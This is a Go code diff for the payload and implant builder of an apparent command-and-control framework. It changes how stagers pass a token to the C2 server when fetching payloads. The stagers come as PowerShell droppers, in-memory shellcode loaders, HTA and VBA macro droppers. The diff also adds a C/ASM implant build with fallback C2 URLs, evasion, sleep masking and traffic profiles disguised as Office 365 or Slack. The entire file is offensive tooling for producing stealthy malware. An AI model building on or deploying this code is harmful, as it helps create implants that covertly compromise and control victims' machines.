@@ -91,7 +91,8 @@ func runStager(cmd *cobra.Command, _ []string) error {
 		return fmt.Errorf("read stager binary: %w", err)
 	}
 
-	stageURL := strings.TrimRight(c2, "/") + "/stage/" + token
+	// Token travels in X-Stage-Token header — endpoint URL has no token in path.
+	stageEndpoint := strings.TrimRight(c2, "/") + "/stage/payload"
 
 	var data []byte
 	var ext string
@@ -100,15 +101,15 @@ func runStager(cmd *cobra.Command, _ []string) error {
 	case "exe":
 		data, ext = exeBytes, ".exe"
 	case "ps1":
-		data, ext = []byte(templatePS1Drop(stageURL)), ".ps1"
+		data, ext = []byte(templatePS1Drop(stageEndpoint, token)), ".ps1"
 	case "ps1-mem":
-		data, ext = []byte(templatePS1Shellcode(stageURL)), ".ps1"
+		data, ext = []byte(templatePS1Shellcode(stageEndpoint, token)), ".ps1"
 	case "hta":
-		data, ext = []byte(templateHTA(stageURL, exeBytes)), ".hta"
+		data, ext = []byte(templateHTA(stageEndpoint, token, exeBytes)), ".hta"
 	case "vba":
-		data, ext = []byte(templateVBA(stageURL)), ".bas"
+		data, ext = []byte(templateVBA(stageEndpoint, token)), ".bas"
 	case "cs":
-		data, ext = []byte(templateCS(stageURL)), ".cs"
+		data, ext = []byte(templateCS(stageEndpoint, token)), ".cs"
 	case "shellcode":
 		sc, err := pe2Shellcode(exeBytes)
 		if err != nil {
@@ -168,6 +169,8 @@ func init() {
 	stagelessCmd.Flags().Bool("compress", false, "UPX-compress the output binary")
 	stagelessCmd.Flags().String("profile", "", "Path to OPSEC profile YAML (overrides evasion flags)")
 	stagelessCmd.Flags().String("c2-profile", "", "Malleable C2 profile name: default|office365|cdn|jquery|slack|ocsp")
+	stagelessCmd.Flags().String("lang", "go", "Implant language: go|c  (c = C/ASM MinGW build)")
+	stagelessCmd.Flags().String("fallback-urls", "", "Comma-separated fallback C2 URLs (C implant only)")
 	stagelessCmd.Flags().String("output", "", "Output file path")
 	_ = stagelessCmd.MarkFlagRequired("c2")
 	_ = stagelessCmd.MarkFlagRequired("key")
@@ -189,6 +192,8 @@ func runStageless(cmd *cobra.Command, _ []string) error {
 	compress, _ := cmd.Flags().GetBool("compress")
 	profilePath, _ := cmd.Flags().GetString("profile")
 	c2ProfileName, _ := cmd.Flags().GetString("c2-profile")
+	lang, _ := cmd.Flags().GetString("lang")
+	fallbackURLs, _ := cmd.Flags().GetString("fallback-urls")
 	output, _ := cmd.Flags().GetString("output")
 
 	var profile *OpsecProfile
@@ -231,6 +236,40 @@ func runStageless(cmd *cobra.Command, _ []string) error {
 	if output != "" {
 		outDir = filepath.Dir(output)
 		outName = strings.TrimSuffix(filepath.Base(output), ".exe")
+	}
+
+	// ── C/ASM build path ──────────────────────────────────────────────────
+	if lang == "c" {
+		cCfg := &CConfig{
+			ServerURL:     c2,
+			EncKey:        key,
+			SecKey:        secKey,
+			IntervalSec:   interval,
+			JitterPct:     jitter,
+			KillDate:      killDate,
+			ExecMethod:    execMethod,
+			EnableEvasion: evasion,
+			SleepMasking:  sleepMask,
+			FallbackURLs:  fallbackURLs,
+			Debug:         false,
+			OutputDir:     outDir,
+			OutputName:    outName,
+		}
+		if profile != nil {
+			cCfg.WorkHoursOnly = profile.WorkingHoursOnly
+			cCfg.WorkStart = profile.WorkingHoursStart
+			cCfg.WorkEnd = profile.WorkingHoursEnd
+		}
+		result, err := BuildC(cCfg)
+		if err != nil {
+			return err
+		}
+		fmt.Printf("[+] C implant        : %s\n", result.OutputPath)
+		fmt.Printf("    Size             : %d KB\n", result.FileSize/1024)
+		fmt.Printf("    SHA256           : %s\n", result.SHA256)
+		fmt.Printf("    MD5              : %s\n", result.MD5)
+		fmt.Printf("    Build time       : %s\n", result.BuildTime.Round(time.Millisecond))
+		return nil
 	}
 
 	g := New(filepath.Join(moduleRoot(), "cmd", "agent"))
